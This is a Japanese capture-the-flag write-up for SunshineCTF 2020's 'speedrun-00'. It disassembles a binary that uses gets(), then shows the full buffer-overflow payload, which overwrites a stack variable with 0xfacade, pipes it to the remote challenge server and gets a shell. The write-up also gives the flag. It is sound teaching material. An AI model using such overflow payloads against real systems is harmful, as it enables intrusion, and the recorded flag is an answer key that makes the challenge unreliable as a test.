# speedrun-00:Speedrun:10pts
nc chal.2020.sunshinectf.org 30000  
[chall_00](chall_00)  

# Solution
ファイルが配られる。  
```bash
$ file chall_00
chall_00: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dadca72eeddf37ba3b9fed1543b8ccdf75cbc78e, not stripped
$ ./chall_00
This is the only one
AAAAA
$ ./chall_00
This is the only one
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (コアダンプ)
```
実行ファイルであり、BOFがありそうだ。  
gdbでmainを見てみる。  
```bash
$ gdb chall_00
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000000006ca <+0>:     push   rbp
   0x00000000000006cb <+1>:     mov    rbp,rsp
   0x00000000000006ce <+4>:     sub    rsp,0x40
   0x00000000000006d2 <+8>:     lea    rdi,[rip+0xcb]        # 0x7a4
   0x00000000000006d9 <+15>:    call   0x580 <puts@plt>
   0x00000000000006de <+20>:    lea    rax,[rbp-0x40]
   0x00000000000006e2 <+24>:    mov    rdi,rax
   0x00000000000006e5 <+27>:    mov    eax,0x0
   0x00000000000006ea <+32>:    call   0x5a0 <gets@plt>
   0x00000000000006ef <+37>:    cmp    DWORD PTR [rbp-0x4],0xfacade
   0x00000000000006f6 <+44>:    jne    0x704 <main+58>
   0x00000000000006f8 <+46>:    lea    rdi,[rip+0xba]        # 0x7b9
   0x00000000000006ff <+53>:    call   0x590 <system@plt>
   0x0000000000000704 <+58>:    cmp    DWORD PTR [rbp-0x8],0xfacade
   0x000000000000070b <+65>:    jne    0x719 <main+79>
   0x000000000000070d <+67>:    lea    rdi,[rip+0xa5]        # 0x7b9
   0x0000000000000714 <+74>:    call   0x590 <system@plt>
   0x0000000000000719 <+79>:    nop
   0x000000000000071a <+80>:    leave
   0x000000000000071b <+81>:    ret
End of assembler dump.
gdb-peda$ q
```
`gets`でオーバーフローさせて、`cmp    DWORD PTR [rbp-0x4],0xfacade`や`cmp    DWORD PTR [rbp-0x8],0xfacade`を真にしてやればよい。  
gdbなどでパディングを調整し、以下のように書き換えを行う。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00";cat) | ./chall_00
This is the only one
ls
chall_00
^C
$ (python -c 'import sys; sys.stdout.buffer.write(b"A"*56 +  b"\xde\xca\xfa\x00")';cat) | ./chall_00
This is the only one

ls
chall_00
^C
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00";cat) | nc chal.2020.sunshinectf.org 30000
This is the only one
ls
chall_00
flag.txt
cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
^C
```
シェルが得られるので、flag.txtを見るとflagが書かれていた。  

## sun{burn-it-down-6208bbc96c9ffce4}